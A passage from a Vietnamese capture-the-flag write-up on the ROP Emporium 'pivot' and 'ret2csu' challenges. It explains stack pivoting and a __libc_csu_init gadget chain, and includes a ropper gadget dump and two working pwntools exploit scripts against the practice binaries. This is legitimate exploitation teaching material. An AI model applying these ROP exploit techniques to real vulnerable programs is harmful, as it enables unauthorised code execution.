    - `0x00000000004006b0 : call rax` thực thi để cập nhật giá trị địa chỉ thực của hàm trong bộ nhớ chương trình
- Vì ofset để ghi đè `rip` là 40 byte và chỉ còn 24 byte cho các chuỗi gadget nên không đủ cho các chuỗi gadget thực thi mục đích, vì vậy ta dùng kĩ thuật `stack pivot`, có nghĩa là thay đổi luồng thực thi của chương trình bằng cách thay đổi con trỏ `rsp`. Trong các gadget trong tệp nhị phân không có lệnh `leave, ret` thì ta có thể dùng lệnh `xchg rsp, rax ; ret` để thay đổi `rsp` bằng cách đổi giá trị 2 thanh ghi với nhau bằng lệnh `xchg`
- Ở bài này cho ta nhập 2 lần, lần đầu cho nhập 256 byte và in ra địa chỉ heap của dữ liệu đầu vào đầu tiên nên lúc này ta stack pivot bằng cách thay `rsp` bằng địa chỉ heap đó bằng lần nhập thứ 2 và ở lần nhập đầu tiên thì ta nhập chuỗi rop cần thực hiện để chương trình có thể thực thi khi `rsp` thay đổi đến đó 

### Script
```python=
#!/usr/bin/python3

from pwn import *

exe = ELF('./pivot', checksec = False)

p = process(exe.path)

ofset = 0x0000000000000a81 - 0x000000000000096a
foothold_got = 0x601040
foothold_plt = 0x400720
pop_rax = 0x00000000004009bb
mov_rax = 0x00000000004009c0
call_rax = 0x00000000004006b0
add_rax_rbp = 0x00000000004009c4
pop_rbp = 0x00000000004007c8
xchg_rsp_rax = 0x00000000004009bd

p.recvuntil(b'to pivot: ')

p.recv(2)

address_exe = int(p.recv(12), 16)

log.info(hex(address_exe))

payload1 = p64(foothold_plt)
payload1 += p64(pop_rax) + p64(foothold_got)
payload1 += p64(pop_rbp) + p64(ofset)
payload1 += p64(mov_rax) + p64(add_rax_rbp) + p64(call_rax)

#input()
p.sendlineafter(b'> ', payload1)

payload2 = b'A'*40
payload2 += p64(pop_rax) + p64(address_exe)
payload2 += p64(xchg_rsp_rax)

p.sendlineafter(b'> ', payload2)

p.interactive()
```

# **Ret2csu**

### Phân tích

- Challenge này nhiệm vụ như challeng `callme` và ofset để ghi đè con trỏ `rip` cũng là 40 byte
- Gợi ý của challenge

![image](https://hackmd.io/_uploads/ryQ4_IjE0.png)

- Xem các gadget
```
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x000000000040057e: adc byte ptr [rax], ah; jmp rax;
0x000000000040054f: add bl, dh; ret;
0x00000000004004da: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004006ad: add byte ptr [rax], al; add bl, dh; ret;
0x00000000004006ab: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret;
0x0000000000400611: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret;
0x0000000000400622: add byte ptr [rax], al; add byte ptr [rdi + 1], bh; call 0x510; nop; pop rbp; ret;
0x0000000000400628: add byte ptr [rax], al; call 0x510; nop; pop rbp; ret;
0x0000000000400623: add byte ptr [rax], al; mov edi, 1; call 0x510; nop; pop rbp; ret;
0x0000000000400586: add byte ptr [rax], al; pop rbp; ret;
0x00000000004006b2: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret;
0x0000000000400574: add byte ptr [rax], al; test rax, rax; je 0x588; pop rbp; mov edi, 0x601038; jmp rax;
0x00000000004005b6: add byte ptr [rax], al; test rax, rax; je 0x5c8; pop rbp; mov edi, 0x601038; jmp rax;
0x0000000000400585: add byte ptr [rax], r8b; pop rbp; ret;
0x00000000004005e7: add byte ptr [rcx], al; pop rbp; ret;
0x0000000000400624: add byte ptr [rdi + 1], bh; call 0x510; nop; pop rbp; ret;
0x0000000000400626: add dword ptr [rax], eax; add byte ptr [rax], al; call 0x510; nop; pop rbp; ret;
0x00000000004004d6: add eax, 0x200b1d; test rax, rax; je 0x4e2; call rax;
0x00000000004004d6: add eax, 0x200b1d; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
0x00000000004004e3: add esp, 8; ret;
0x00000000004004e2: add rsp, 8; ret;
0x00000000004004d9: and byte ptr [rax], al; test rax, rax; je 0x4e2; call rax;
0x00000000004004d9: and byte ptr [rax], al; test rax, rax; je 0x4e2; call rax; add
 rsp, 8; ret;
0x000000000040060b: call 0x500; mov eax, 0; pop rbp; ret;
0x000000000040062a: call 0x510; nop; pop rbp; ret;
0x00000000004005dd: call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400793: call qword ptr [rax];
0x00000000004004e0: call rax;
0x00000000004004e0: call rax; add rsp, 8; ret;
0x000000000040068c: fmul qword ptr [rax - 0x7d]; ret;
0x00000000004004d2: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x200b1d; test rax, rax; je 0x4e2; call rax;
0x00000000004004de: je 0x4e2; call rax;
0x00000000004004de: je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400579: je 0x588; pop rbp; mov edi, 0x601038; jmp rax;
0x00000000004005bb: je 0x5c8; pop rbp; mov edi, 0x601038; jmp rax;
0x00000000004007d3: jmp qword ptr [rbp];
0x0000000000400581: jmp rax;
0x00000000004006f3: jmp rsp;
0x00000000004005e2: mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov
 eax, 0; pop rbp; ret;
0x0000000000400610: mov eax, 0; pop rbp; ret;
0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400609: mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005db: mov ebp, esp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x000000000040057c: mov edi, 0x601038; jmp rax;
0x0000000000400625: mov edi, 1; call 0x510; nop; pop rbp; ret;
0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400608: mov rbp, rsp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005da: mov rbp, rsp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400583: nop dword ptr [rax + rax]; pop rbp; ret;
0x00000000004005c5: nop dword ptr [rax]; pop rbp; ret;
0x00000000004005e5: or ah, byte ptr [rax]; add byte ptr [rcx], al; pop rbp; ret;
0x00000000004004d3: or byte ptr [rax - 0x75], cl; add eax, 0x200b1d; test rax, rax; je 0x4e2; call rax;
0x00000000004004d8: or esp, dword ptr [rax]; add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004005e4: or r12b, byte ptr [r8]; add byte ptr [rcx], al; pop rbp; ret;
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040069e: pop r13; pop r14; pop r15; ret;
0x00000000004006a0: pop r14; pop r15; ret;
0x00000000004006a2: pop r15; ret;
0x000000000040057b: pop rbp; mov edi, 0x601038; jmp rax;
0x000000000040069b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040069f: pop rbp; pop r14; pop r15; ret;
0x0000000000400588: pop rbp; ret;
0x00000000004006a3: pop rdi; ret;
0x00000000004006a1: pop rsi; pop r15; ret;
0x000000000040069d: pop rsp; pop r13; pop r14; pop r15; ret;
0x0000000000400607: push rbp; mov rbp, rsp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005d9: push rbp; mov rbp, rsp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x00000000004004dd: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004004d7: sbb eax, 0x4800200b; test eax, eax; je 0x4e2; call rax;
0x00000000004004d7: sbb eax, 0x4800200b; test eax, eax; je 0x4e2; call rax; add rsp, 8; ret;
0x00000000004006b5: sub esp, 8; add rsp, 8; ret;
0x00000000004004d1: sub esp, 8; mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
0x00000000004006b4: sub rsp, 8; add rsp, 8; ret;
0x00000000004004d0: sub rsp, 8; mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
0x00000000004004dc: test eax, eax; je 0x4e2; call rax;
0x00000000004004dc: test eax, eax; je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400577: test eax, eax; je 0x588; pop rbp; mov edi, 0x601038; jmp rax;
0x00000000004005b9: test eax, eax; je 0x5c8; pop rbp; mov edi, 0x601038; jmp rax;
0x00000000004004db: test rax, rax; je 0x4e2; call rax;
0x00000000004004db: test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400576: test rax, rax; je 0x588; pop rbp; mov edi, 0x601038; jmp rax;
0x00000000004005b8: test rax, rax; je 0x5c8; pop rbp; mov edi, 0x601038; jmp rax;
0x000000000040062f: nop; pop rbp; ret;
0x00000000004004e6: ret;

87 gadgets found
```
- Ta thấy có 2 gadget để set tham số cho hàm `ret2win()`
```
0x00000000004006a3: pop rdi; ret;
0x00000000004006a1: pop rsi; pop r15; ret;
```
- Không tìm thấy gadget nào hữu ích để set tham số còn lại `rdx`
- Hãy xem hàm ` __libc_csu_init()` theo gợi ý của bài\
![image](https://hackmd.io/_uploads/ByuIYIs4C.png)
- Ta thấy có gadget dùng để set tham số cho `rdx` và cả `rsi`
```
0x0000000000400680 <+64>:    mov    rdx,r15
0x0000000000400683 <+67>:    mov    rsi,r14
```
- Để set cho thanh ghi `rdx`, `rsi` từ `r15`, `r14` thì có các gadget 
```
0x000000000040069a <+90>:    pop    rbx
0x000000000040069b <+91>:    pop    rbp
0x000000000040069c <+92>:    pop    r12
0x000000000040069e <+94>:    pop    r13
0x00000000004006a0 <+96>:    pop    r14
0x00000000004006a2 <+98>:    pop    r15
0x00000000004006a4 <+100>:   ret
```
- Ta dùng các gadget trên để đặt các giá trị vào các thanh ghi trước khi set các thanh ghi `rdx`, `rsi`
- Nhưng sau khi set giá trị cho `rdx`, `rsi` thì có lệnh 
`0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]`
- Lệnh này gọi con trỏ lệnh đang trỏ của địa chỉ `[r12 + rbx*8]` 
- Sau lệnh này còn lệnh 
```
0x000000000040068d <+77>:    add    rbx,0x1
0x0000000000400691 <+81>:    cmp    rbp,rbx
0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
```
- Để luồng thực thi chương trình không bị chuyển sang hàm khác thì ta set `rbx` là `0` còn `rbp` là `0x1`
- Vậy lệnh `call   QWORD PTR [r12+rbx*8]` chỉ phụ thuộc vào thanh ghi `r12`
- Ý tưởng ban đầu là set `r12` là địa chỉ `got` của `ret2win` để có thể nhảy đến và in được cờ
- Nhưng không dễ dàng thế vì trước lệnh `call` thì có lệnh ` mov    edi,r13d` đã làm thay đổi tham số trước khi gọi hàm nên không thể in flag............(!_!)
- Sau khi đọc tài liệu của challenge đã đưa thì nhiệm vụ của ta bây giờ là sẽ `call` vào các lệnh mà khi trả về hàm hiện tại thì sẽ không làm thay đổi các thanh ghi tham số của `ret2win()` 
- Ta xem hàm `_fini` một hàm trong ELF nằm ở phần `&_DYNAMIC`
![image](https://hackmd.io/_uploads/Hknhlwo4R.png)
- Ta thấy hàm này sẽ không làm thay đổi luồng thực thi của ta 
- Tìm địa chỉ này trong `&_DYNAMIC`
![image](https://hackmd.io/_uploads/BklVbPi4C.png)
- Thấy địa chỉ `0x600e48` đang trỏ đến hàm `_fini`. Đây là điều ta cần 
- Đã có đầy đủ thông tin, bắt đầu viết script
### Script
```python=
#!/usr/bin/python3

from pwn import *

exe = ELF('./ret2csu', checksec = False)

p = process(exe.path)

mov_rdx = 0x0000000000400680
pop_rdi = 0x00000000004006a3
pop_rbx_rbp_r12 = 0x000000000040069a
ret2win_plt = 0x400510
_fini = 0x600e48

payload = b'A'*40
payload += p64(pop_rbx_rbp_r12) + p64(0) + p64(0x1) + p64(_fini) + p64(0) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(mov_rdx) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
payload += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(ret2win_plt)

#input()
p.sendlineafter(b'> ', payload)

p.interactive()
```
